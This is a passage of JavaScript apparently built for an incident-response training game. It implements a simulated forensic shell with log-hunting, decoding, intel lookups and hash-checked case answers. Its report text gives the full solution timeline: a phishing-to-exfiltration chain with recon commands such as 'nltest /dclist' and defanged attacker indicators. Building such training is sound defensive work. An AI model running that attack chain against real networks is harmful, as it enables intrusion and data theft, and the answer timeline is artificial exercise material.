      if (n.type === 'file') { return io.out(abs.split('/').pop()); }
      const names = Object.keys(n.children).filter((k) => all || !k.startsWith('.')).sort();
      if (!long) { return io.out(names.map((k) => (n.children[k].type === 'dir' ? k + '/' : k)).join('  ')); }
      io.out(names.map((k) => {
        const c = n.children[k];
        const size = c.type === 'dir' ? 4096 : c.binary ? (k.endsWith('.pcap') ? 51840211 : 142336) : String(read(c)).length;
        return `${c.type === 'dir' ? 'd' : '-'}r--r-----  ${USER}  ${String(size).padStart(8)}  Nov 18 09:48  ${k}${c.type === 'dir' ? '/' : ''}`;
      }).join('\n'));
    },
    cd: (args, io) => {
      const abs = resolve(args[0]);
      const n = node(abs);
      if (!n) { return io.err(`cd: ${args[0]}: No such file or directory`); }
      if (n.type !== 'dir') { return io.err(`cd: ${args[0]}: Not a directory`); }
      cwd = abs; setPrompt();
    },
    pwd: (a, io) => io.out(cwd),
    whoami: (a, io) => io.out(USER),
    id: (a, io) => io.out('uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),1001(soc)'),
    hostname: (a, io) => io.out(HOST),
    date: (a, io) => io.out('Wed Nov 18 10:31:07 UTC 2026'),
    echo: (args, io) => io.out(args.join(' ')),
    cat: (args, io) => { if (!args.length && io.stdin == null) { return io.err('cat: missing file operand'); } const t = inputText(args, io, 'cat'); if (t != null) { io.out(t); } },
    head: (args, io) => { const n = parseInt(opt(args, '-n') || '10', 10); const t = inputText(args, io, 'head'); if (t != null) { io.out(lines(t).slice(0, n).join('\n')); } },
    tail: (args, io) => { const n = parseInt(opt(args, '-n') || '10', 10); const t = inputText(args, io, 'tail'); if (t != null) { io.out(lines(t).slice(-n).join('\n')); } },
    wc: (args, io) => {
      const t = inputText(args.filter((a) => !a.startsWith('-')), io, 'wc'); if (t == null) { return; }
      io.out(args.includes('-l') ? String(lines(t).length) : `${lines(t).length} ${t.split(/\s+/).filter(Boolean).length} ${t.length}`);
    },
    grep: (args, io) => {
      const isFlag = (a) => /^-[ivcE]+$/.test(a);
      const flags = args.filter(isFlag).join('');
      const rest = args.filter((a) => !isFlag(a));
      if (!rest.length) { return io.err('usage: grep [-i -v -c -E] <pattern> [file...]'); }
      const [pat, ...files] = rest;
      const t = inputText(files, io, 'grep'); if (t == null) { return; }
      const ci = flags.includes('i');
      let test;
      if (flags.includes('E')) {
        let re; try { re = new RegExp(pat, ci ? 'i' : ''); } catch (e) { return io.err('grep: invalid regular expression'); }
        test = (l) => re.test(l);
      } else { const needle = ci ? pat.toLowerCase() : pat; test = (l) => (ci ? l.toLowerCase() : l).includes(needle); }
      const hits = lines(t).filter((l) => (flags.includes('v') ? !test(l) : test(l)));
      io.out(flags.includes('c') ? String(hits.length) : hits.join('\n'));
    },
    sort: (args, io) => {
      const fl = args.filter((a) => a.startsWith('-')).join('');
      const t = inputText(args.filter((a) => !a.startsWith('-')), io, 'sort'); if (t == null) { return; }
      let l = lines(t);
      l.sort(fl.includes('n') ? (a, b) => parseFloat(a) - parseFloat(b) : undefined);
      if (fl.includes('r')) { l.reverse(); }
      if (fl.includes('u')) { l = l.filter((x, i) => i === 0 || x !== l[i - 1]); }
      io.out(l.join('\n'));
    },
    uniq: (args, io) => {
      const t = inputText(args.filter((a) => !a.startsWith('-')), io, 'uniq'); if (t == null) { return; }
      const res = [];
      for (const l of lines(t)) { if (res.length && res[res.length - 1][1] === l) { res[res.length - 1][0]++; } else { res.push([1, l]); } }
      io.out(res.map(([c, l]) => (args.includes('-c') ? `${String(c).padStart(7)} ${l}` : l)).join('\n'));
    },
    cut: (args, io) => {
      let d = '\t'; let f = null; const files = [];
      for (let i = 0; i < args.length; i++) {
        const a = args[i];
        if (a === '-d') { d = args[++i]; } else if (a.startsWith('-d')) { d = a.slice(2); }
        else if (a === '-f') { f = args[++i]; } else if (a.startsWith('-f')) { f = a.slice(2); } else { files.push(a); }
      }
      if (!f || !d) { return io.err('usage: cut -d<delim> -f<n[,m]> [file]'); }
      const idx = f.split(',').map((x) => parseInt(x, 10) - 1);
      const t = inputText(files, io, 'cut'); if (t == null) { return; }
      io.out(lines(t).map((l) => { const p = l.split(d); return idx.map((i) => p[i] ?? '').join(d); }).join('\n'));
    },
    tr: (args, io) => {
      if (args.length < 2 || io.stdin == null) { return io.err('usage: ... | tr <set1> <set2>'); }
      const [a, b] = args;
      io.out([...io.stdin].map((c) => { const i = a.indexOf(c); return i === -1 ? c : (b[i] ?? b[b.length - 1]); }).join(''));
    },
    file: (args, io) => {
      if (!args.length) { return io.err('usage: file <path>'); }
      for (const f of args.flatMap(glob)) {
        const n = node(resolve(f));
        if (!n) { io.err(`file: ${f}: No such file or directory`); continue; }
        io.out(`${f}: ${n.type === 'dir' ? 'directory' : f.endsWith('.pcap') ? 'pcap capture file, microsecond ts (little-endian), Ethernet, snaplen 262144'
          : n.binary ? 'PE32+ executable (GUI) x86-64, for MS Windows, 6 sections' : 'ASCII text'}`);
      }
    },
    strings: (args, io) => {
      const min = parseInt(opt(args, '-n') || '4', 10) || 4;
      const t = inputText(args, io, 'strings'); if (t == null) { return; }
      if (typeof t !== 'string') { return io.out('(no useful strings in a capture; try tshark)'); }
      io.out((t.match(new RegExp(`[\\x20-\\x7e]{${min},}`, 'g')) || []).join('\n'));
    },
    sha256sum: async (args, io) => {
      if (!args.length) { return io.err('usage: sha256sum <file>'); }
      for (const f of args.flatMap(glob)) {
        const n = node(resolve(f));
        if (!n || n.type !== 'file') { io.err(`sha256sum: ${f}: No such file`); continue; }
        const c = read(n);
        io.out(`${await sha256(typeof c === 'string' ? c : JSON.stringify(c))}  ${f}`);
      }
    },
    decode: (args, io) => {
      const OPS = {
        b64: (s) => atob(s.replace(/\s+/g, '')),
        utf16le: (s) => { let r = ''; for (let i = 0; i + 1 < s.length; i += 2) { r += String.fromCharCode(s.charCodeAt(i) | (s.charCodeAt(i + 1) << 8)); } return r; },
        hex: (s) => s.replace(/[^0-9a-f]/gi, '').replace(/../g, (h) => String.fromCharCode(parseInt(h, 16))),
        rot13: (s) => s.replace(/[a-z]/gi, (c) => String.fromCharCode((c <= 'Z' ? 65 : 97) + ((c.toLowerCase().charCodeAt(0) - 97 + 13) % 26))),
        url: (s) => decodeURIComponent(s),
        rev: (s) => [...s].reverse().join('')
      };
      const ops = []; const rest = [...args];
      while (rest.length && OPS[rest[0].toLowerCase()]) { ops.push(rest.shift().toLowerCase()); }
      if (!ops.length) { return io.err('usage: decode <ops...> [text]   ops: b64 utf16le hex rot13 url rev   e.g. decode b64 utf16le <blob>'); }
      let s = rest.length ? rest.join(' ') : io.stdin;
      if (s == null) { return io.err('decode: no input'); }
      try { for (const o of ops) { s = OPS[o](o === 'utf16le' ? s : s.trim()); } } catch (e) { return io.err(`decode: ${ops.join(' → ')} failed: the input doesn't look like that encoding`); }
      if (/\u0000/.test(s)) { io.err('decode: the output has null bytes between characters. UTF-16LE? Add utf16le.'); }
      io.out(s);
    },
    hunt: (args, io) => {
      const a = [...args];
      if (a.includes('--schema')) {
        const types = [...new Set(EVENTS.map((e) => e.event))].sort();
        return io.out(`events:   ${EVENTS.length} (2026-11-18 08:00-11:00 UTC, all hosts)\ntypes:    ${types.join(', ')}\nfields:   ${FIELD_ORDER.join(', ')}\n\nfilters:  field=value (case-insensitive, * wildcard)   field!=value\noptions:  --fields a,b,c   --stats field   --limit N\nexample:  hunt event=ProcessRollup2 host=fin-ws07 image=power* --fields time,pid,ppid,cmd`);
      }
      const fields = opt(a, '--fields'); const stats = opt(a, '--stats'); const limit = parseInt(opt(a, '--limit') || '0', 10);
      const filters = [];
      for (const t of a) {
        const m = t.match(/^([a-z_]+)(!?=)(.*)$/i);
        if (!m) { return io.err(`hunt: don't understand '${t}'. Use field=value. See 'hunt --schema'.`); }
        if (!FIELD_ORDER.includes(m[1])) { return io.err(`hunt: unknown field '${m[1]}'. See 'hunt --schema'.`); }
        filters.push([m[1], m[2] === '!=', new RegExp('^' + escRe(m[3]).replace(/\*/g, '.*') + '$', 'i')]);
      }
      if (!filters.length && !stats) { return io.err('hunt: add a filter, e.g. hunt event=DnsRequest host=fin-ws07   (see hunt --schema)'); }
      let res = EVENTS.filter((e) => filters.every(([f, neg, re]) => { const v = e[f]; const hit = v !== undefined && re.test(String(v)); return neg ? !hit : hit; }));
      if (stats) {
        const counts = {};
        res.forEach((e) => { const v = e[stats] === undefined ? '(none)' : String(e[stats]); counts[v] = (counts[v] || 0) + 1; });
        const rows = Object.entries(counts).sort((x, y) => y[1] - x[1]);
        return io.out([`${'count'.padStart(7)}  ${stats}`].concat(rows.map(([v, c]) => `${String(c).padStart(7)}  ${v}`)).join('\n'));
      }
      if (limit > 0) { res = res.slice(0, limit); }
      if (!res.length) { return io.out('(no matching events)'); }
      if (fields) {
        const fl = fields.split(',').map((x) => x.trim());
        return io.out(res.map((e) => fl.map((f) => (e[f] === undefined ? '-' : e[f])).join('\t')).join('\n'));
      }
      io.out(res.map(fmtEvent).join('\n'));
    },
    proctree: (args, io) => {
      const host = (args[0] || '').toLowerCase();
      if (!host) { return io.err('usage: proctree <host>'); }
      const ps = EVENTS.filter((e) => e.event === 'ProcessRollup2' && e.host === host);
      if (!ps.length) { return io.err(`proctree: no process telemetry for '${host}'. Hosts: ${[...new Set(EVENTS.map((e) => e.host))].sort().join(', ')}`); }
      const byPid = new Map(ps.map((p) => [p.pid, p]));
      const kids = (pid) => ps.filter((p) => p.ppid === pid).sort((x, y) => (x.time < y.time ? -1 : 1));
      const res = [`${host}: ${ps.length} processes (command lines cut at 90 chars; full: hunt event=ProcessRollup2 host=${host} --fields pid,cmd)`, ''];
      const walk = (p, pre, last, root) => {
        const cmd = p.cmd.length > 90 ? p.cmd.slice(0, 89) + '…' : p.cmd;
        res.push(`${root ? '' : pre + (last ? '└─ ' : '├─ ')}${p.image} [${p.pid}] ${p.time.slice(11, 19)} ${p.user}  ${cmd}`);
        const ch = kids(p.pid);
        ch.forEach((c, i) => walk(c, root ? '' : pre + (last ? '   ' : '│  '), i === ch.length - 1, false));
      };
      ps.filter((p) => !byPid.has(p.ppid)).forEach((r) => walk(r, '', true, true));
      io.out(res.join('\n'));
    },
    intel: (args, io) => {
      if (!args.length) { return io.err('usage: intel <domain|ip|hash|email>'); }
      const k = args[0].toLowerCase().replace(/[[\]]/g, '');
      io.out(INTEL[k] || `No intel for ${args[0]}. (Benign infrastructure and internal assets usually have none.)`);
    },
    mitre: (args, io) => {
      if (!args.length) { return io.err('usage: mitre <technique id | keyword>'); }
      const q = args.join(' ').toLowerCase();
      const hits = MITRE.filter(([id, name, tac]) => id.toLowerCase().startsWith(q) || name.toLowerCase().includes(q) || tac.toLowerCase().includes(q));
      io.out(hits.length ? hits.map(([id, name, tac]) => `${id.padEnd(10)} ${name}\n${''.padEnd(10)} tactics: ${tac}`).join('\n') : `mitre: nothing matches '${args.join(' ')}' in the offline subset`);
    },
    tshark: (args, io) => {
      const a = [...args];
      const f = opt(a, '-r');
      if (!f) { return io.err('usage: tshark -r <file.pcap> [-q -z conv,tcp]'); }
      const n = node(resolve(f));
      if (!n || !n.content || !n.content.pcap) { return io.err(`tshark: "${f}" is not a capture file`); }
      const convs = n.content.convs;
      if (a.includes('-z') && a.includes('conv,tcp')) {
        const rule = '='.repeat(96);
        const hdr = `${'Address A'.padEnd(20)}     ${'Address B'.padEnd(20)} ${'Frames'.padStart(7)} ${'Bytes A→B'.padStart(11)} ${'Bytes B→A'.padStart(11)} ${'Duration'.padStart(9)}`;
        return io.out([rule, 'TCP Conversations', 'Filter:<No Filter>', hdr]
          .concat(convs.map((c) => `${c[0].padEnd(20)} <-> ${c[1].padEnd(20)} ${String(c[2]).padStart(7)} ${String(c[3]).padStart(11)} ${String(c[4]).padStart(11)} ${c[5].padStart(9)}`))
          .concat([rule]).join('\n'));
      }
      const rows = []; let t = 0;
      for (let i = 0; i < 12; i++) {
        const c = convs[i % convs.length]; t += 0.013 * (i + 1);
        const [sa, sp] = c[0].split(':'); const [da, dp] = c[1].split(':');
        rows.push(`${String(i + 1).padStart(4)} ${t.toFixed(6).padStart(10)} ${sa.padEnd(13)} → ${da.padEnd(14)} TCP ${String(60 + ((i * 397) % 1400)).padStart(5)} ${sp} → ${dp} [${i % 3 ? 'ACK' : 'PSH, ACK'}]`);
      }
      io.out(rows.join('\n') + `\n... ${convs.reduce((s, c) => s + c[2], 0) - 12} more packets. Summarise with: -q -z conv,tcp`);
    },
    questions: (a, io) => {
      io.out(QUESTIONS.map((x, i) => `${solved.has(i + 1) ? '[x]' : '[ ]'} ${String(i + 1).padStart(2)}. ${x.q}`).join('\n') + `\n\nanswer <n> <value>   ·   hint <n>   ·   ${solved.size}/${QUESTIONS.length} answered`);
    },
    progress: (a, io) => {
      const bar = QUESTIONS.map((_, i) => (solved.has(i + 1) ? '█' : '░')).join('');
      io.out(`case HX-4471  ${bar}  ${solved.size}/${QUESTIONS.length}${solved.size === QUESTIONS.length ? '  CLOSED' : ''}`);
    },
    hint: (args, io) => {
      const n = parseInt(args[0], 10) || (QUESTIONS.findIndex((_, i) => !solved.has(i + 1)) + 1);
      if (!n) { return io.out("Every question is answered. Try 'report'."); }
      const q = QUESTIONS[n - 1]; if (!q) { return io.err(`hint: there is no question ${args[0]}`); }
      const lvl = Math.min(hintLevel[n] || 0, q.h.length - 1);
      io.out(`hint ${n} (${lvl + 1}/${q.h.length}): ${q.h[lvl]}`);
      hintLevel[n] = lvl + 1;
    },
    answer: async (args, io) => {
      const n = parseInt(args[0], 10);
      const val = args.slice(1).join(' ');
      if (!n || !QUESTIONS[n - 1] || !val) { return io.err('usage: answer <question number> <value>      e.g. answer 2 somehost'); }
      if (solved.has(n)) { return io.out(`Question ${n} is already answered.`); }
      const h = await sha256(`hx2:${n}:${norm(val)}`);
      if (!ANSWERS[n].includes(h)) { return io.err(`✗ ${n}: not quite. Check the evidence again, or 'hint ${n}'.`); }
      solved.add(n); save();
      io.ok(`✓ ${n}: correct. ${solved.size}/${QUESTIONS.length}`);
      if (solved.size === QUESTIONS.length) {
        const W = 48; const row = (t) => '  │ ' + t.padEnd(W - 1) + '│';
        io.ok(['', '  ┌' + '─'.repeat(W) + '┐', row('CASE HX-4471 CLOSED'), row(''), row('Initial access → execution → persistence →'),
          row('lateral movement → collection → exfiltration.'), row('Every link proven from evidence.'), row(''),
          row("Run 'report' for the incident timeline."), '  └' + '─'.repeat(W) + '┘'].join('\n'));
      }
    },
    report: (a, io) => {
      if (solved.size < QUESTIONS.length) { return io.err(`report: ${QUESTIONS.length - solved.size} question(s) still open. The timeline unlocks when the case is solved.`); }
      io.out(
`INCIDENT TIMELINE · HX-4471 · 2026-11-18 (UTC)
09:12  Lure from invoice@halcyon-billing[.]example to 3 users        T1566.001
09:14  a.kowalski opens Invoice_88213.docm on fin-ws07                 T1204.002
09:14  winword.exe → powershell -enc, fetches stage 2                  T1059.001 T1027
09:14  cdn-updates[.]example → 203.0.113[.]66, odsync.exe dropped
09:15  Scheduled task "OneDriveSyncHelper" (on logon)                 T1053.005
09:20  Implant beacons to 203.0.113[.]66:8443                          T1071.001
09:31  whoami /groups, nltest /dclist, net view \\\\fs01               T1033 T1482 T1135
10:02  WMI to fs01 as svc_backup (service account misuse)             T1047 T1078.002
10:05  7z archives D:\\Shares\\Finance\\Q3 → Q3_forecast.7z             T1560.001
10:07  ~50.5 MB pushed to 203.0.113[.]66:8443                          T1041
10:08  Archive deleted                                                 T1070.004

Scope: fin-ws07 and fs01 compromised. fin-ws03 and hr-ws02 resolved the domain:
check them. Next: contain both hosts, disable and rotate svc_backup, block the
domain and IP, remove the task, tell the Finance data owners.`);
    },
    reset: (a, io) => { solved.clear(); save(); Object.keys(hintLevel).forEach((k) => delete hintLevel[k]); io.out('Case progress reset.'); },
    history: (a, io) => io.out(history.map((h, i) => `  ${String(i + 1).padStart(3)}  ${h}`).join('\n')),
    clear: () => { out.textContent = ''; },
    exit: (a, io) => { io.out('logout'); document.dispatchEvent(new CustomEvent('hx-shell-close')); },
    sudo: (a, io) => io.err(`${USER} is not in the sudoers file. This incident will be reported. (Fitting, today.)`),
    rm: (a, io) => io.err('rm: evidence is read-only. Chain of custody says no.'),
    vim: (a, io) => io.out("vim: you'd never get out. Use cat."),
    nano: (a, io) => io.out('nano: not installed. Use cat.'),
    ssh: (a, io) => io.err('ssh: the affected hosts are isolated. Work from telemetry.'),
    ping: (a, io) => io.err('ping: the forensic network has no route out. By design.'),
    curl: (a, io) => io.err("curl: no internet from the forensic network. Use 'intel' for lookups.")
  };
  cmds.logout = cmds.exit; cmds['?'] = cmds.help; cmds.cyberchef = cmds.decode; cmds.less = cmds.cat; cmds.more = cmds.cat;

  /* ---------- run a command line (with pipes) ---------- */
  const run = async (raw) => {
    print(`${promptEl.textContent} ${raw}`, 'hx-term__echo');
    const line = raw.trim();
    if (!line) { return; }
    history.push(line); hIdx = history.length;
    const parsed = parse(line);
    if (parsed.error) { return print(`shell: ${parsed.error}`, 'hx-term__err'); }
    let stdin = null;
    const { stages } = parsed;
    for (let s = 0; s < stages.length; s++) {
      const [cmd, ...args] = stages[s];
      if (!cmd) { return print('shell: syntax error near |', 'hx-term__err'); }
      const fn = cmds[cmd];
      if (!fn) { return print(`${cmd}: command not found. Type 'help'.`, 'hx-term__err'); }
      const buf = [];
      const isLast = s === stages.length - 1;
      const io = {
        stdin,
        out: (t) => { buf.push(String(t)); },
        ok: (t) => { if (isLast) { print(t, 'hx-term__ok'); } else { buf.push(String(t)); } },
        err: (t) => print(t, 'hx-term__err')
      };
      await fn(args, io);
      stdin = buf.join('\n');
      if (isLast && buf.length) {
        const all = stdin.split('\n');
        all.slice(0, MAX_LINES).forEach((l) => print(l));
        if (all.length > MAX_LINES) { print(`... ${all.length - MAX_LINES} more lines (narrow it down with grep or head)`, 'hx-term__dim'); }
      }
    }
  };

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const v = input.value; input.value = '';
    await run(v);
    term.scrollTop = term.scrollHeight;
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowUp' && history.length) { e.preventDefault(); hIdx = Math.max(0, hIdx - 1); input.value = history[hIdx]; }
    else if (e.key === 'ArrowDown' && history.length) { e.preventDefault(); hIdx = Math.min(history.length, hIdx + 1); input.value = history[hIdx] || ''; }
    else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); cmds.clear(); }
    else if (e.key === 'Tab') {
      e.preventDefault();
      const parts = input.value.split(/\s+/);
      const last = parts[parts.length - 1];
      if (parts.length === 1 || parts[parts.length - 2] === '|') {
        const m = Object.keys(cmds).filter((c) => c.startsWith(last));
        if (m.length === 1) { parts[parts.length - 1] = m[0] + ' '; input.value = parts.join(' '); } else if (m.length > 1) { print(m.join('  '), 'hx-term__dim'); }
        return;
      }
      const slash = last.lastIndexOf('/');
      const dirPart = slash >= 0 ? last.slice(0, slash + 1) : '';
      const base = last.slice(slash + 1);
      const n = node(resolve(dirPart || '.'));
      if (n && n.type === 'dir') {
        const m = Object.keys(n.children).filter((k) => k.startsWith(base) && (base.startsWith('.') || !k.startsWith('.')));
        if (m.length === 1) { parts[parts.length - 1] = dirPart + m[0] + (n.children[m[0]].type === 'dir' ? '/' : ''); input.value = parts.join(' '); }
        else if (m.length > 1) { print(m.join('  '), 'hx-term__dim'); }
      }
    }
  });

  term.addEventListener('click', () => { if (!window.getSelection().toString()) { input.focus(); } });

  /* ---------- boot ---------- */
  setPrompt();
  print('Last login: Wed Nov 18 09:16:52 2026 from 10.20.9.1', 'hx-term__dim');
  print('Halcyon Labs SOC forensic workstation. Authorized use only.', 'hx-term__dim');
  print('');
  print('Pager: TICKET-4471 is yours. A finance workstation is running encoded PowerShell.');
  print("Start with 'cat README.txt'. 'help' lists the tools, 'questions' the case questions.");
  if (solved.size) { print(`Case progress restored: ${solved.size}/${QUESTIONS.length} answered.`, 'hx-term__ok'); }
  print('');

  // Focus only when the shell is revealed (never steal focus or scroll on page load).
  document.addEventListener('hx-shell-open', () => { input.focus({ preventScroll: true }); });
}
